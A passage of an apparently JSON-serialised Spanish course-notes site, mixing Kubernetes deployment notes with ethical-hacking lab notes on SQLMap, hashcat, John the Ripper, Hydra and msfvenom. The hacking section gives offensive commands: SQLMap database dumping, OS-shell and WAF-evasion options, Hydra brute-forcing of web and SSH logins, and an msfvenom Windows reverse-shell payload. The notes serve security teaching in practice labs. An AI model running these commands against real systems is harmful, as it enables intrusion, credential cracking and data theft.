Creamos a continuaci√≥n otro pod que realizar√° una consulta a la base de datos, pero lo har√° a mysql-read con lo que comprobaremos que se ha realizado la sincronizaci√≥n a los secundarios:\n\nkubectl run mysql-client --image=mysql:5.7 -i -t --rm --restart=Never --\\\n  mysql -h mysql-read -e &quot;SELECT * FROM prueba.saludos&quot;\n\n\nPodemos comprobar los servidores que responden a una consulta a mysql-read solicitando el identificador del servidor en unas cuantas iteraciones, para lo que ejecutamos de forma interactiva una consulta repetidas veces para que se muestre el id del servidor que est√° respondiendo y as√≠ se vea el balanceo sobre todos los nodos:\n\nkubectl run mysql-client-loop --image=mysql:5.7 bash\n\n\nfor i in `seq 1 10`; do mysql -h mysql-read -e &#039;SELECT @@server_id,NOW()&#039;; sleep 1; done&quot;\n"},"Despliegue-de-aplicaciones-web/kubernetes/index":{"title":"index","links":["Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores","Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker","Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores","Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows","Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod","Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods","Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad","Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset","Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset","Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments","Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment","Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment","Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller","Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas","Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados","Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno","Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps","Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets","Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes","Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente","Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo","Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets","Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets","Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs","Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql","Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm","Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones"],"tags":[],"content":"Kubernetes\nApuntes sobre Kubernetes\n\n1.0-introduccion-a-kubernetes\n\n1.1-implantacion-de-aplicaciones-web-en-contenedores\n1.2-docker\n1.3-orquestadores-de-contenedores\n1.4-el-proyecto-kubernetes\n1.5-arquitectura-basica-de-kubernetes\n\n\n2.0-instalacion-de-kubernetes\n\n2.1-alternativas-para-instalacion-simple-de-k8s\n2.2-introduccion-a-la-instalacion-de-minikube\n2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox\n2.4-instalacion-de-minikube-en-windows-+-virtualbox\n2.5-instalacion-y-configuracion-de-kubectl-en-linux\n2.6-instalacion-y-configuracion-de-kubectl-en-windows\n2.7-despliegues-de-aplicaciones-en-kubernetes\n\n\n3.0-contenedores-en-kubernetes\n\n3.1-describiendo-un-pod\n3.2-gestionando-los-pods\n\n\n4.0-tolerancia-y-escalabilidad\n\n4.1-describiendo-un-replicaset\n4.2-gestionando-los-replicaset\n\n\n5.0-deployments\n\n5.1-describiendo-un-deployment\n5.2-gestion-basica-de-un-deployment\n5.3-actualizacion-y-desactualizacion-de-un-deployment\n\n\n6.0-acceso-a-las-aplicaciones\n\n6.1-describiendo-services\n6.2-gestionando-los-services\n6.3-servicio-dns-en-kubernetes\n6.4-ingress-controller\n6.5-ejemplo-completo-aplicacion-de-temperaturas\n\n\n7.0-despliegue-parametrizados\n\n7.1-variables-de-entorno\n7.2-configmaps\n7.3-secrets\n7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb\n\n\n8.0-almacenamiento-en-kubernetes\n\n8.1-volumenes-en-kubernetes\n8.2-aprovisionamiento-de-volumenes\n8.3-solicitud-de-volumenes\n8.4-uso-de-volumenes\nejemplo-1-gestion-estatica-de-volumenes\nejemplo-2-gestion-dinamica-de-volumenes\nejemplo-3-wordpress-con-almacenamiento-persistente\n\n\n9.0-otras-cargas-de-trabajo\n\n9.1-statefulsets\n9.2-daemonsets\n9.3-jobs-y-cronjobs\nejemplo-despliegue-de-un-cluster-con-mysql\n\n\n10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm\n\n10.1-instalacion-de-helm\n10.2-gestion-de-charts-y-despliegue-de-aplicaciones\n\n\n\nMateriales desarrollados por: Alberto Molina Coballes y Jos√© Domingo Mu√±oz Rodr√≠guez\nPropiedad de la Consejer√≠a de Educaci√≥n y Deporte de la Junta de Andaluc√≠a\nBajo licencia: Creative Commons CC BY-NC-SA"},"Despliegue-de-aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Intro a redes: tryhackme.com/r/room/whatisnetworking"},"Hacking-√©tico/RA-5/SQLMap":{"title":"SQLMap","links":[],"tags":[],"content":"\n\t.reveal { font-size: 1.5em; }\n\t.reveal div { justify-content: flex-start  !important; }\n\t.reveal table { font-size: 0.2em; }\n\t.reveal h1 { font-size: 4em; color: #4169E1; }\n\t.reveal h2 { font-size: 3em; color: #2979FF; }\n\t.reveal h3 { font-size: 2em; color: #1E90FF; }\n\t.reveal p { font-size: 1.5em; color: black; text-align: left; }\n\t.reveal ul { align-self: flex-start;  text-align: justify; margin-left: 4.5em; margin-right: 2em }\n\t.reveal li { text-align: left; }\n\t.footnotes li { font-size: 1em;  color: grey;}\n\t.footnotes p { font-size: 1em;  color: grey;}\n\nSQLMap: Automatizaci√≥n de Inyecciones SQL\n\n1. Introducci√≥n\n1.1 ¬øQu√© es SQLMap?\n\nHerramienta de c√≥digo abierto para automatizar la detecci√≥n y explotaci√≥n de vulnerabilidades de inyecci√≥n SQL.\nDesarrollada en Python.\nSoporta una amplia gama de bases de datos.\n\n1.2 Importancia de las inyecciones SQL\n\nUna de las vulnerabilidades web m√°s comunes y peligrosas.\nPuede llevar a la p√©rdida de datos confidenciales, modificaci√≥n de datos o incluso control total del servidor.\n\n\n2. Funcionalidades Principales\n\nDetecci√≥n de vulnerabilidades de inyecci√≥n SQL.\nExplotaci√≥n de vulnerabilidades para obtener informaci√≥n de la base de datos.\nSoporte para diferentes t√©cnicas de inyecci√≥n SQL (basadas en booleanos, basadas en errores, basadas en tiempo, etc.).\nEnumeraci√≥n de bases de datos, tablas y columnas.\nExtracci√≥n de datos.\nEjecuci√≥n de comandos del sistema operativo.\nSoporte para diferentes tipos de bases de datos.\n\n\n3. Conceptos b√°sicos\n3.1 Inyecci√≥n SQL: Repaso r√°pido\n\nT√©cnica de ataque que explota vulnerabilidades en aplicaciones web.\nPermite ejecutar comandos SQL maliciosos en una base de datos.\nEjemplo b√°sico:\n\nSELECT * FROM users WHERE id = &#039;1&#039; OR &#039;1&#039;=&#039;1&#039;;\n3.2 ¬øC√≥mo encaja SQLMap?\n\nAutomatiza la detecci√≥n de puntos de inyecci√≥n.\nExtrae datos (usuarios, tablas, contrase√±as) sin escribir consultas manualmente.\nReduce el tiempo y esfuerzo en pruebas de seguridad.\n\n\n4. T√©cnicas de Inyecci√≥n SQL\n\nInyecciones basadas en booleanos: Se utilizan para determinar si una condici√≥n es verdadera o falsa.\nInyecciones basadas en errores: Se aprovechan los mensajes de error de la base de datos para obtener informaci√≥n.\nInyecciones basadas en tiempo: Se miden los tiempos de respuesta del servidor para inferir informaci√≥n.\nInyecciones UNION: Se combina una consulta maliciosa con una consulta v√°lida para extraer datos.\nInyecciones apiladas: Se ejecutan m√∫ltiples consultas SQL separadas por punto y coma.\nOut-of-band: Se usa para cuando no hay manera de obtener los resultados por el mismo canal.\n\n\n5. Instalaci√≥n y requisitos\n5.1 Requisitos previos\n\nSistema operativo: Linux, Windows o macOS. 1\nPython instalado (versi√≥n compatible con SQLMap).\nDescarga desde el repositorio oficial:\n\ngit clone github.com/sqlmapproject/sqlmap.git\n5.2 Instalaci√≥n b√°sica\n\nClonar el repositorio o descargar el archivo ZIP.\nNavegar al directorio: cd sqlmap.\nEjecutar: python sqlmap.py -h para verificar.\n\n\n6. Uso b√°sico de SQLMap\n6.1 Sintaxis general\n\nComando base: python sqlmap.py -u &quot;URL&quot; [opciones].\nEjemplo: python sqlmap.py -u &quot;example.com/page\n\n6.2 Opciones comunes\n\n-hh: Para obtener todas las opciones posibles.\n-u: Especifica la URL objetivo.\n--dbs: Enumera las bases de datos disponibles.\n--tables: Lista las tablas de una base de datos.\n--dump: Extrae los datos de una tabla.\n--schema: permite obtener informaci√≥n sobre la estructura de la base de datos, como bases de datos, tablas, columnas.\n\n\n6.3 Ejemplos pr√°cticos:\n# Lista de bases de datos detectadas (ej. `information_schema`, `usuarios`)\npython sqlmap.py -u &quot;example.com/page --dbs\n \n# Enumerar tablas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; --tables\n \n# Enumerar columnas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; --columns\n \n# Extraer datos\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; -C &lt;columna1,columna2&gt; --dump\n\n7. Funcionalidades avanzadas\n7.1 Detecci√≥n autom√°tica\n\n--level: Nivel de profundidad en las pruebas (1-5).\n--risk: Nivel de riesgo en las pruebas (1-3).\n\n\n7.2 Extracci√≥n de datos\n\n--dump-all: Descarga toda la base de datos.\n--sql-shell: Abre una shell SQL interactiva.\n--os-shell: Obtener una shell del sistema operativo.\n-r: Cargar una petici√≥n HTTP desde un archivo.\n--data: Enviar datos POST.\n--cookie: Especificar cookies.\n--proxy: Utilizar un proxy.\n--batch: Modo autom√°tico.\n-p: indica el par√°metro que es vulnerable\n--technique: indica la t√©cnica a emplear, por ejemplo, inyecciones basadas en booleanos (B) o usar UNION (U).\n\n\n7.3 Ejemplos complejos\n\nLas siguientes peticiciones usamos sqlmap con una request capturada. La request se puede obtener con burp suite u OWASP Zap, haciendo clic derecho y descargando la request.\nUno de los problemas que nos podemos encontrar con SQLMap es que tengamos que ignorar ciertos c√≥digos de error, como el 401.\nA veces sucede que corta la salida de texto cuando son muchos datos a devolver. Para evitarlo se usa --no-cast y --no-escape.\nLa opci√≥n --flush se utiliza para forzar la salida inmediata de los resultados de cada consulta SQL ejecutada por la herramienta.\n\nsqlmap -r req.txt --ignore-code=401 --dbms=sqlite --level=5 --risk=3 --technique=B -T &lt;table&gt; --columns\n \nsqlmap -u http://URL?q= --dbms=sqlite --level 5 --risk 3 --schema --no-cast --no-escape\n \nsqlmap -u &#039;http://URL?q=test&#039; -p &#039;q&#039; --dbms=&quot;sqlite&quot; --technique U --prefix &quot;&#039;)) &quot; --level 5 --risk 3 --dump-all --no-cast --no-escape --flush\n\n7.4 Evasi√≥n de seguridad\n\n--tamper: Usa scripts para evadir WAFs o filtros.\n\n# Ejemplo\npython sqlmap.py -u &quot;URL&quot; --tamper=space2comment\n\n8. Demostraci√≥n en vivo\n8.1 Escenario\n\nConfigurar un entorno vulnerable con DVWA github.com/digininja/DVWA\nEjecutar:\n\nsqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --dbs\n\nMostrar resultados en pantalla.\n\n\n9. Mejores pr√°cticas y √©tica\n9.1 Uso responsable\n\nSQLMap, al igual que el resto de herramientas de hacking √©tico, solo se debe usar en entornos de prueba o con permiso expl√≠cito.\n\n9.2 Limitaciones de SQLMap\n\nNo reemplaza el an√°lisis manual.\nPuede generar falsos positivos o negativos.\nDepende de la configuraci√≥n del objetivo.\n\n\n10. Conclusi√≥n\n10.1 Resumen\n\nSQLMap es una herramienta poderosa para pruebas de inyecci√≥n SQL.\nF√°cil de usar, pero requiere conocimientos b√°sicos de SQL y seguridad.\nIdeal para aprender y practicar pentesting √©tico.\n\n10.2 Documentaci√≥n\n\nDocumentaci√≥n oficial de SQLMap: sqlmap.org/\n\nFootnotes\n\n\nEn kali linux ya viene instalado. ‚Ü©\n\n\n"},"Hacking-√©tico/analisis-de-archivos-hash":{"title":"analisis-de-archivos-hash","links":[],"tags":[],"content":"An√°lisis de archivos (hash)\nEn las siguientes webs podr√°s verificar si un archivo, IP, hash o dominio son maliciosos:\nwww.virustotal.com/gui/home/upload\nmetadefender.opswat.com/"},"Hacking-√©tico/analisis-de-logs":{"title":"analisis-de-logs","links":[],"tags":[],"content":"An√°lisis de logs\nComandos interesantes:\n\ncut\nsort\nuniq\nnl\nwc\ngrep\nbase64\n\nPregunta 1\ncut -d &#039; &#039; -f2 access.log | sort | uniq -c | sort -n | nl\nPregunta 2\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq | sort -n | nl\nPregunta 3\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 | sort | uniq -c | sort -nr\ngrep partnerservices.getmicrosoftkey.com access.log | cut -d &#039; &#039; -f6 | sort | uniq\nPregunta 4\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq -c | sort -n | nl | tail -n 5\nPregunta 5\ngrep frostlings.bigbadstash.thm access.log | grep 200 | cut -d &#039; &#039; -f2 | sort | uniq\nPregunta 6\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d | grep -i THM{"},"Hacking-√©tico/cracking-hashes/README":{"title":"README","links":[],"tags":[],"content":"Cracking hashes\nPara crackear hashes algunas de las herramientas m√°s relevantes son:\n\nHashcat\nJohn the ripper\n\nPara ver qu√© tipo de hash es podemos usar:\n\nHashcat y que lo reconozca autom√°ticamente\nHaiti\n\nPara hacer ataques con wordlist podemos usar:\n\nRockyou. En Kali en /usr/share/wordlist/rockyou.txt.gz\nSecLists: github.com/danielmiessler/SecLists\n\nPara buscar nuevas wordlist podemos usar:\n\nwordlistctl : github.com/BlackArch/wordlistctl\n\nRecopilaci√≥n de informaci√≥n sobre cracking\ninventory.raw.pm/overview.html"},"Hacking-√©tico/cracking-hashes/cewl":{"title":"cewl","links":[],"tags":[],"content":"CEWL\nA veces no tenemos una wordlist clara, pero intuimos que en la p√°gina web puede haber palabras relevantes (keywords). En ese caso podemos usar CEWL (github.com/digininja/CeWL) para ello. Adem√°s podemos indicar con ‚Äú-d‚Äù si queremos que se usen subp√°ginas para generar la wordlist.\ncewl -d 2 -w $(pwd)/wordlist.txt http://URL/index.html"},"Hacking-√©tico/cracking-hashes/haiti":{"title":"haiti","links":[],"tags":[],"content":"Haiti\nHaiti es una herramienta que permite la identificaci√≥n de hashes. Enlace a la herramienta: noraj.github.io/haiti/#/\nhaiti &#039;1aec7a56aa08b25b596057e1ccbcb6d768b770eaa0f355ccbd56aee5040e02ee&#039;\nSi a√∫n as√≠ no sacamos qu√© tipo de hash puede ser, o si es alguno poco habitual, podemos usar la web:\nhashcat.net/wiki/doku.php\nEsa web nos permite ver si ese hash incluye algo de prefijo o sufijo. Por ejemplo BLAKE2b-512, que su hash necesita del prefijo BLAKE2.\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"Hacking-√©tico/cracking-hashes/hashcat":{"title":"hashcat","links":[],"tags":[],"content":"Hashcat\nEjemplo de uso de hashcat:\nhashcat &#039;48bb6e862e54f2a795ffc4e541caed4d&#039; -m 0 /usr/share/wordlists/rockyou.txt.gz\nDonde:\n\n‚Äò48bb6e862e54f2a795ffc4e541caed4d‚Äô es el hash que quiero descifrar\n-m indica el tipo de encriptado que tiene el hash a desencriptar. Si no se conoce el tipo de encriptado se puede dejar en blanco y hashcat sugerir√° los tipos m√°s probables que puede tener.\n/usr/share/wordlist/rockyou.txt.gz aqu√≠ se indica la wordlist que se desea emplear para romper el cifrado\n\nSi no se indica el par√°metro ‚Äú-a‚Äù se asume que ‚Äú-a 0‚Äù por lo que intentar√° un ataque con una wordlist.\nOtros ejemplos empleados:\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; /usr/share/wordlists/rockyou.txt.gz -m 3200\nhashcat &#039;$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.&#039; /usr/share/wordlist/rockyou.gz.txt\n\nHay que tener en cuenta de este √∫ltimo ejemplo que ‚ÄúaReallyHardSalt‚Äù es la salt del encriptado. Se incluye dentro del cifrado.\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; -a 3 -m 3200 -i --increment-min=4 -1?l ?1?1?1?1\n\nEn este √∫ltimo caso se ha realizado un ataque de fuerza bruta (-a 3) teniendo en cuenta que se comenzara a generar palabras a partir de 4 letras, teniendo en cuenta que el patr√≥n fuera solo de alfab√©tico en min√∫sculas (1?l).\n\n?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?h = 0123456789abcdef\n?H = 0123456789ABCDEF\n?s = ¬´space¬ª!‚Äù#$%&amp;‚Äô()*+,-./:;‚áê&gt;?@[\\]^_`{|}~\n?a = ?l?u?d?s\n?b = 0x00 - 0xff\n\nSi quiero solo min√∫sculas y n√∫meros ser√°: -1?l?d\nPara crackear un sha-1 con salt, hay que a√±adir la salt tras la contrase√±a separado de : (en el siguiente ejemplo la salt es ‚Äútryhackme‚Äù)\nhashcat &#039;e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme&#039; /usr/share/wordlists/rockyou.txt.gz -m 160\nA no tenemos claro cu√°l es el -m que debemos emplear pero s√≠ tenemos el tipo de encriptado. Para buscarlo r√°pidamente podemos emplear:\nhashcat -h | grep -i -e sha1 -e sha-1 | grep salt \nDonde -i permite buscar independientemente de min√∫sculas o may√∫sculas. -e permite realizar una or con grep. Luego el resultado lo filtramos de nuevo para buscar por salt.\nA veces, cuando rompemos el hash queremos comprobar si el resultado se corresponde con la entrada. Para encriptar un texto r√°pidamente desde consola podemos emplear:\necho -n easy | md5sum\nEl -n es fundamental para no a√±adir un salto de l√≠nea en el echo y que el resultado cambie.\nPor otro lado, es posible que rockyou se nos haga una wordlist demasiado amplia. Si conocemos la longitud exacta de caracteres que va a tener la palabra original, podemos aplicar un patr√≥n regex a rockyou para filtrar por las palabras que tengan ese n√∫mero de caracteres exacto. Por ejemplo, para generar una nueva wordlist que tenga todas las palabras de rockyou de 6 caracteres:\ngrep &#039;^......$&#039; /usr/share/wordlists/rockyou.txt &gt; rockyou-6.txt\nAntes de terminar quer√≠a advertir sobre el uso de -f o ‚Äîforce con hashcat. Esa flag debe usarse con cuidado y solo si se tiene claro qu√© se est√° haciendo.\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"Hacking-√©tico/cracking-hashes/john-the-ripper":{"title":"john-the-ripper","links":[],"tags":[],"content":"John the ripper\nPara ver el listado de hashes que es capaz de romper john the ripper. Aqu√≠ lo acompa√±amos de un grep para filtrar y mostrar solo el que buscamos.\njohn --list=formats | grep -i Keccak-256\nPara crear reglas personalizadas para john the ripper, crearlas en un archivo /usr/share/john/john-local.conf. Las reglas que se pueden crear est√°n en el enlace: www.openwall.com/john/doc/RULES.shtml. Un ejemplo de regla, para a√±adir dos n√∫meros a las reglas por defecto es la siguiente:\n// En el archivo /usr/share/john/john-local.conf\n[List.Rules:11]\n$[0-9]$[0-9]\n// Para usar las palabras del rev√©s\n[List.Rules:12]\nr\n// Para usar repeticiones de palabras\n[List.Rules:13]\nd\ndd\nddd\n\nSi no se sabe d√≥nde est√° la instalaci√≥n de john the ripper, se puede usar el comando:\nlocate john.conf\nAhora podemos usar la regla creada. En este ejemplo usamos la nueva regla creada y adem√°s usamos las wordlists de la lista de seclists (github.com/danielmiessler/SecLists)\njohn hash.txt --format=raw-sha1 --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --rules=THM01\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"Hacking-√©tico/cracking-hashes/wordlistctl":{"title":"wordlistctl","links":[],"tags":[],"content":"wordlistctl\nPara descargar una wordlist para nombres de perros, por ejemplo:\nsudo python wordlistctl.py fetch fetch_term -l dogs -d"},"Hacking-√©tico/hacking-web/hydra":{"title":"hydra","links":[],"tags":[],"content":"Hydra\nEjemplo de ruptura de login web\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -V\n\nRuptura de SSH\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 ssh\n"},"Hacking-√©tico/index":{"title":"Hacking √©tico","links":["Hacking-√©tico/ra-criterios-contenidos-practicas","Hacking-√©tico/cracking-hashes/README","Hacking-√©tico/cracking-hashes/john-the-ripper","Hacking-√©tico/cracking-hashes/hashcat","Hacking-√©tico/cracking-hashes/haiti","Hacking-√©tico/cracking-hashes/wordlistctl","Hacking-√©tico/cracking-hashes/cewl","Hacking-√©tico/post-explotacion/README","Hacking-√©tico/post-explotacion/msfvenom","Hacking-√©tico/analisis-de-logs","Hacking-√©tico/webs-para-aprender-mas","Hacking-√©tico/analisis-de-archivos-hash","hacking-web/README","Hacking-√©tico/hacking-web/hydra"],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluaci√≥n, contenidos y posibles enlaces a las pr√°cticas a realizar:\nRA - criterios - contenidos - pr√°cticas\nOtros art√≠culos\n\nCracking hashes\nJohn the ripper\n\nHashcat\nHaiti\nwordlistctl\nCEWL\n\n\nPost-explotaci√≥n\n\nmsfvenom\n\n\nAn√°lisis de logs\nWebs para aprender m√°s\nAn√°lisis de archivos (hash)\nHacking web\n\nHydra\n\n\nRA - Criterios - Contenidos - Pr√°cticas\n"},"Hacking-√©tico/post-explotacion/README":{"title":"README","links":[],"tags":[],"content":"Post-explotaci√≥n\nDentro de la postexplotaci√≥n encontramos los t√≠picos comandos de linux, como: pwd, whoami, id, sudo -l. Con estos comandos ya nos haremos una idea de en qu√© m√°quina estamos, con qu√© usuario, en qu√© carpeta, y si ese usuario tiene permisos de sudo."},"Hacking-√©tico/post-explotacion/msfvenom":{"title":"msfvenom","links":[],"tags":[],"content":"msfvenom\nMSFVenom es una herramienta, dentro del framework de Metasploit, que nos permite generar archivos con payloads dentro. Es decir, en lugar de incluir el payload en un exploit, como har√≠amos con la herramienta msfconsola, el objetivo aqu√≠ es crear un ‚Äúmalware‚Äù que al ejecutarlo lance el payload.\nEste tipo de malware nos puede permitir escalar privilegios.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o reverse.exe"},"Hacking-√©tico/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Pr√°cticas\nRA 1. Determina herramientas de monitorizaci√≥n para detectar vulnerabilidades aplicando t√©cnicas de hacking √©tico.\nCriterios de evaluaci√≥n:\na) Se ha definido la terminolog√≠a esencial del hacking √©tico.\n\nContenido asociado: Elementos esenciales del hacking √©tico.\n\nPr√°cticas\n\nCarreras de ciber: tryhackme.com/r/room/careersincyber\nIntro a Linux: tryhackme.com/r/room/linuxfundamentalspart1\n\nb) Se han identificado los conceptos √©ticos y legales frente al ciberdelito.\n\nContenido asociado: Diferencias entre hacking, hacking √©tico, tests de penetraci√≥n y hacktivismo.\n\nc) Se ha definido el alcance y condiciones de un test de intrusi√≥n.\n\nContenido asociado: Recolecci√≥n de permisos y autorizaciones previos a un test de intrusi√≥n.\n\nd) Se han identificado los elementos esenciales de seguridad: confidencialidad, autenticidad, integridad y disponibilidad.\n\ntryhackme.com/r/room/securityprinciples\n\ne) Se han identificado las fases de un ataque seguidas por un atacante.\n\nContenido asociado: Fases del hacking.\nContenido asociado: Auditor√≠as de caja negra y de caja blanca.\n\nPr√°cticas:\n\ntryhackme.com/r/room/cyberkillchainzmt\n\nf) Se han analizado y definido los tipos vulnerabilidades.\n\nContenido asociado: Documentaci√≥n de vulnerabilidades.\n\ng) Se han analizado y definido los tipos de ataque.\n\nBiene perfecta: tryhackme.com/r/room/commonattacks\n\nh) Se han determinado y caracterizado las diferentes vulnerabilidades existentes.\ni) Se han determinado las herramientas de monitorizaci√≥n disponibles en el mercado adecuadas en funci√≥n del tipo de organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n de herramientas de seguridad y hacking.\nContenido asociado: ClearNet, Deep Web, Dark Web, Darknets. Conocimiento, diferencias y herramientas de acceso: Tor. ZeroNet, 